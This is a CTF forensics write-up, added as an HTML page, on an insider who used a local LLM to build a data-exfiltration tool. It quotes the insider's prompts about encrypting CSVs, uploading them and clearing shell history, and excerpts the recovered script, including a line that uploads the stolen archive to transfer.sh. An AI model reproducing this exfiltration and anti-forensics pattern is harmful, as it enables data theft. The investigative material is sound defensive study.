@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; font-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self' mailto:; upgrade-insecure-requests">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<title>Whisper · BlackHat MEA 2026 writeup</title>
+<meta name="description" content="The local Ollama prompt history is an uncensored record of the insider designing the exfil tool, including the passphrase. The script itself.">
+<link rel="canonical" href="https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/whisper/">
+<link rel="alternate" type="application/rss+xml" title="Usama Arshad, Writing" href="/feed.xml">
+<link rel="icon" href="/assets/favicon.ico">
+<link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
+<meta name="theme-color" content="#131110">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="Usama Arshad">
+<meta property="og:title" content="Whisper · BlackHat MEA 2026 writeup">
+<meta property="og:description" content="The local Ollama prompt history is an uncensored record of the insider designing the exfil tool, including the passphrase. The script itself.">
+<meta property="og:url" content="https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/whisper/">
+<meta property="og:image" content="https://www.usamaarshad.me/assets/og.jpg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:creator" content="@usama0x01">
+<meta name="twitter:title" content="Whisper · BlackHat MEA 2026 writeup">
+<meta name="twitter:description" content="The local Ollama prompt history is an uncensored record of the insider designing the exfil tool, including the passphrase. The script itself.">
+<meta name="twitter:image" content="https://www.usamaarshad.me/assets/og.jpg">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "TechArticle",
+  "headline": "Whisper: BlackHat MEA 2026 CTF writeup",
+  "description": "The local Ollama prompt history is an uncensored record of the insider designing the exfil tool, including the passphrase. The script itself.",
+  "datePublished": "2026-11-04",
+  "author": {
+    "@type": "Person",
+    "name": "Usama Arshad",
+    "url": "https://www.usamaarshad.me/"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/whisper/"
+  },
+  "articleSection": "Forensics",
+  "proficiencyLevel": "Expert",
+  "isPartOf": {
+    "@type": "Article",
+    "name": "BlackHat MEA 2026 CTF qualifiers",
+    "url": "https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/"
+  }
+}
+</script>
+<link rel="preload" href="/assets/fonts/fraunces-normal-340-640.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/fonts/inter-normal-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/fonts/jetbrainsmono-normal-400.woff2" as="font" type="font/woff2" crossorigin>
+<script>document.documentElement.classList.add("js");</script>
+<link rel="stylesheet" href="/assets/css/writeup.css">
+</head>
+<body>
+<div class="progress" id="prog" aria-hidden="true"></div>
+<a class="skip" href="#main">Skip to content</a>
+<header class="site-head" id="top">
+  <div class="container head-inner">
+    <a class="wordmark" href="/" aria-label="Usama Arshad, home">Usama Arshad<span class="dot">.</span></a>
+    <nav aria-label="Breadcrumb">
+      <a class="back-link" href="/blog/blackhat-mea-2026-quals/"><span class="arr" aria-hidden="true">←</span><span class="txt">All 15 challenges</span></a>
+    </nav>
+    <a class="btn btn-ghost head-cta" href="/assets/Usama-Arshad-Resume.pdf" download>Résumé</a>
+  </div>
+</header>
+
+<main id="main">
+  <section class="hero" aria-labelledby="pt">
+    <div class="container">
+      <div class="masthead" data-reveal>
+        <p class="masthead-meta">
+          <span>Challenge 5 of 15</span>
+          <span>Forensics</span>
+          <span class="live">Solved · 100 pts</span>
+        </p>
+      </div>
+      <div class="hero-deck">
+        <div class="deck-copy" data-reveal style="--d:.08s">
+          <p class="kicker">BlackHat MEA 2026 · Qualifiers</p>
+          <h1 class="hero-title" id="pt">Whisper<span class="dot">.</span></h1>
+          <p class="deck">Linux workstation triage. An insider used a local LLM to build an exfiltration tool.</p>
+          <p class="wu-meta">
+            <span class="cat cat-forensics">Forensics</span><span class="sep">·</span>
+            <span>100 points</span><span class="sep">·</span>
+            <span>4 November 2026</span>
+          </p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="container">
+      <div class="wu-layout">
+        <article class="wu" data-reveal>
+          <div class="tldr"><p class="lab">TL;DR</p><p>The local Ollama prompt history is an uncensored record of the insider designing the exfil tool, including the passphrase. The script itself survives in the GNOME Trash, and it reveals both the key- derivation function and where the archive was staged.</p></div>
+          <div class="flagbox"><span class="lab">Captured</span><span class="flagval">BHFlagY{l0c4l_0ll4m4_llm_f4r3n51c5_2026}</span><button class="reveal-btn" type="button" aria-label="Reveal flag">Reveal</button></div><p class="flag-note">Instances are provisioned per run, so these are the values our instances returned.</p>
+          <section id="recon"><h2><span class="hn">01</span>Recon</h2><p>The evidence set is a full Ubuntu 24.04 workstation tree (~14,000 entries) plus curated collections:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>journal_exports/   journalctl_{full,cron,ssh,ollama}.txt
+system_info/       process_list, network_sockets, dpkg_installed, pip_packages, ...
+home/dwright/      .ollama/history, .local/share/{.venv,Trash}, .cache/fontconfig, ...
+data/reports/      customers_2025.csv employee_directory.csv
+                   revenue_q3.csv      vendor_contracts.csv
+var/log/           auth.log, audit/audit.log{,.1}, syslog, ...
+tmp/               a dozen plausible-looking dotfiles</code></pre></figure>
+<p>Both shell histories are empty, deliberately. <code>/tmp</code> is stocked with decoys (.config_backup_old.tar.gz.mozilla_cache.dat.pip-cache-a8f3b2.tmp, journal-upload.tmp, core.python3.1234...); every one is high-entropy random noise with no recoverable structure. The Trash likewise holds ~60 files, almost all filler.</p>
+<p>The lead is home/dwright/.ollama/history. Amid a hundred ordinary data-engineering questions, the intent is written out in plain language:</p>
+<p>how do I create a password protected zip archive using pyzipper write a python script that reads all csv files from a directory and creates an AES encrypted zip archive use the password Gr33nF0x42!D1amond also upload the archive to a remote server using requests and delete the script after successful execution how do I derive an encryption key from a passphrase using hashlib sha256 how to clean the bash history in terminal so there are no traces</p></section><section id="the-bug"><h2><span class="hn">02</span>The bug</h2><p>This is not a software vulnerability, it is an artifact-retention failure by the insider, and the challenge is built around three of them:</p>
+<ol class="steps"><li>The local LLM keeps a plaintext prompt log. ~/.ollama/history is never cleared. The passphrase Gr33nF0x42!D1amond is typed straight into it, alongside a step-by-step statement of intent that would be the centrepiece of any real investigation.</li><li>"Delete the script after successful execution" was implemented as a move to Trash. ~/.local/share/Trash/files/cache_mgr.py is intact, along with its.trashinfo deletion timestamp.</li><li>The staging path was a cache directory, and the archive was never removed. ~/.cache/ fontconfig/session.zip, a plausible-looking name in a directory nobody inspects, still holds the exfiltrated data.</li></ol>
+<p>The insider also cleared both bash histories, which removes the commands but leaves every artifact they produced.</p></section><section id="exploitation"><h2><span class="hn">03</span>Exploitation</h2><ol class="steps"><li>Recover the tool. grep -ril 'pyzipper'. points at home/dwright/.local/share/Trash/files/ <code>cache_mgr.py</code>, disguised as a "Cache management utility" and importing pyzipper from a hidden venv at ~/.local/share/.venv.</li><li>Read the key derivation. The script does not use the passphrase directly, it does what the LLM was asked for in the follow-up prompt:</li></ol>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>raw_key = os.environ.get("CACHE_KEY", "")
+ARCHIVE_PASSWORD = hashlib.blake2b(raw_key.encode(),
+                                   digest_size=32).hexdigest()[:20].encode()</code></pre></figure>
+<p>With raw_key = "Gr33nF0x42!D1amond", the archive password is d571fe77618f54b7fca8.</p>
+<ol class="steps" start="3"><li>Locate the archive. The same script names it:</li></ol>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>DATA_DIR    = os.path.join("/data", "reports")
+CACHE_DIR   = os.path.join(os.path.expanduser("~"), ".cache", "fontconfig")
+OUTPUT_PATH = os.path.join(CACHE_DIR, "session.zip")        # WZ_AES, ZIP_DEFLATED
+...
+requests.put("https://transfer.sh/backup.zip", data=f, ...)</code></pre></figure>
+<ol class="steps" start="4"><li>Open it and diff against <code>/data/reports.</code> The archive holds five members where the source directory only had four:</li></ol>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>MEMBER                                                          IN /DATA/REPORTS?
+
+customers_2025.csv                                              yes
+
+employee_directory.csv                                          yes
+
+revenue_q3.csv                                                  yes
+
+vendor_contracts.csv                                            yes
+
+internal_api_keys.csv                                           no</code></pre></figure>
+<p>The extra file is the payload. Its key_b64 column is base64; one row decodes to the flag:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>master_vault, production, vault_root
+  -&gt; BHFlagY{l0c4l_0ll4m4_llm_f4r3n51c5_2026}</code></pre></figure>
+<p class="codelabel">Key code import hashlib, pyzipper, base64, csv, io</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>pw = hashlib.blake2b(b"Gr33nF0x42!D1amond", digest_size=32).hexdigest()[:20].encode()</code></pre></figure>
+<p>with pyzipper.AESZipFile("home/dwright/.cache/fontconfig/session.zip") as zf: zf.setpassword(pw) rows = zf.read("internal_api_keys.csv").<code>decode()</code></p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">python</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>for row in csv.DictReader(io.StringIO(rows)):
+    v = base64.b64decode(row["key_b64"]).decode("utf-8", "replace")
+    if "BHFlagY" in v:
+        print(row["service"], "-&gt;", v)
+# master_vault -&gt; BHFlagY{l0c4l_0ll4m4_llm_f4r3n51c5_2026}</code></pre></figure></section><section id="dead-ends"><h2><span class="hn">04</span>Dead ends</h2><ul class="bullets"><li>Everything in <code>/tmp</code> is a decoy. All seven "interesting" dotfiles are uniform random bytes: no headers, no repeating-key structure, no single-byte XOR to printable. Do not spend time on them, and do not treat core.python3.1234... as a real core dump, it is noise too.</li><li>The passphrase from the prompt log is not the archive password. Feeding Gr33nF0x42!D1amond straight to pyzipper fails; the blake2b-truncate-to-20-hex-chars derivation in the script is mandatory. The LLM prompt even asks about hashlib sha256 while the script ships blake2b, trust the code, not the prompt.</li><li>auditd was installed on the host but its logs do not contain the exfil execution; the.trashinfo timestamps and the ollama journal are the reliable timeline sources.</li></ul></section>
+          <nav class="pager" aria-label="Challenge navigation"><a href="/blog/blackhat-mea-2026-quals/qfact/"><span class="dir">← Previous</span><span class="t">Qfact</span></a><a class="nx" href="/blog/blackhat-mea-2026-quals/baiby-pwn/"><span class="dir">Next →</span><span class="t">baiby-pwn</span></a></nav>
+        </article>
+        <aside class="wu-rail">
+          <h2>On this page</h2>
+          <ol><li><a href="#recon">Recon</a></li><li><a href="#the-bug">The bug</a></li><li><a href="#exploitation">Exploitation</a></li><li><a href="#dead-ends">Dead ends</a></li></ol>
+        </aside>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site-foot">
+  <div class="container">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <a class="wordmark" href="/">Usama Arshad<span class="dot">.</span></a>
+        <p>Offensive Security Lead. Red team, AppSec, and cloud security for fintech at scale. Based in Riyadh, Saudi Arabia.</p>
+      </div>
+      <nav class="foot-col" aria-label="Site index">
+        <h2>Index</h2>
+        <ul>
+          <li><a href="/">Portfolio</a></li>
+          <li><a href="/blog/">Writing</a></li>
+          <li><a href="/research/">Research</a></li>
+          <li><a href="/dorks/">Dork library</a></li>
+          <li><a href="/#contact">Contact</a></li>
+        </ul>
+      </nav>
+      <div class="foot-col">
+        <h2>Elsewhere</h2>
+        <ul>
+          <li><a href="https://github.com/usama0x01" target="_blank" rel="noopener">GitHub</a></li>
+          <li><a href="https://wpscan.com/leaderboard/" target="_blank" rel="noopener">WPScan leaderboard</a></li>
+          <li><a href="https://medium.com/@usama0x01" target="_blank" rel="noopener">Medium</a></li>
+          <li><a href="mailto:gusama21@gmail.com">gusama21@gmail.com</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="foot-base">
+      <span>© 2026 Usama Arshad · Riyadh, Saudi Arabia</span>
+      <span class="colophon">Set in Fraunces, Inter &amp; JetBrains Mono, self-hosted · No trackers, no cookies</span>
+      <a href="#top">Back to top ↑</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function () {
+  "use strict";
+  var reduceMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+  var head = document.querySelector(".site-head");
+  function onScroll(){ head.classList.toggle("scrolled", window.scrollY > 8); }
+  window.addEventListener("scroll", onScroll, { passive:true }); onScroll();
+
+  var prog = document.getElementById("prog");
+  if (prog) {
+    var tick = function () {
+      var h = document.documentElement;
+      var max = h.scrollHeight - h.clientHeight;
+      prog.style.width = (max > 0 ? (h.scrollTop / max) * 100 : 0) + "%";
+    };
+    window.addEventListener("scroll", tick, { passive:true });
+    window.addEventListener("resize", tick); tick();
+  }
+
+  var revealEls = Array.prototype.slice.call(document.querySelectorAll("[data-reveal]"));
+  if (reduceMotion || !("IntersectionObserver" in window)) {
+    revealEls.forEach(function (el) { el.classList.add("in"); });
+  } else {
+    var io = new IntersectionObserver(function (es) {
+      es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add("in"); io.unobserve(e.target); } });
+    }, { threshold:0.08, rootMargin:"0px 0px -5% 0px" });
+    revealEls.forEach(function (el) { io.observe(el); });
+    var geo = function () {
+      revealEls.forEach(function (el) {
+        if (!el.classList.contains("in") && el.getBoundingClientRect().top < window.innerHeight*0.95) el.classList.add("in");
+      });
+    };
+    window.addEventListener("scroll", geo, { passive:true });
+    window.addEventListener("resize", geo); geo();
+  }
+
+  document.querySelectorAll(".code-copy").forEach(function (btn) {
+    btn.addEventListener("click", function () {
+      var pre = btn.closest(".code").querySelector("code");
+      var text = pre ? pre.textContent : "";
+      var done = function () {
+        btn.textContent = "Copied"; btn.classList.add("done");
+        setTimeout(function(){ btn.textContent = "Copy"; btn.classList.remove("done"); }, 1400);
+      };
+      if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(done, function(){});
+      else {
+        var ta=document.createElement("textarea"); ta.value=text; ta.style.position="absolute"; ta.style.left="-9999px";
+        document.body.appendChild(ta); ta.select();
+        try { document.execCommand("copy"); done(); } catch(e){}
+        document.body.removeChild(ta);
+      }
+    });
+  });
+
+  document.querySelectorAll(".flagbox .reveal-btn").forEach(function (btn) {
+    btn.addEventListener("click", function () {
+      var box = btn.closest(".flagbox");
+      btn.textContent = box.classList.toggle("shown") ? "Hide" : "Reveal";
+    });
+  });
+
+  var rail = document.querySelector(".wu-rail");
+  if (rail && "IntersectionObserver" in window) {
+    var links = Array.prototype.slice.call(rail.querySelectorAll("a"));
+    var secs = links.map(function (a) { return document.querySelector(a.getAttribute("href")); }).filter(Boolean);
+    var spy = new IntersectionObserver(function (entries) {
+      entries.forEach(function (e) {
+        if (!e.isIntersecting) return;
+        links.forEach(function (a) { a.classList.toggle("on", a.getAttribute("href") === "#" + e.target.id); });
+      });
+    }, { rootMargin:"-20% 0px -70% 0px" });
+    secs.forEach(function (s) { spy.observe(s); });
+  }
+})();
+</script>
+</body>
+</html>
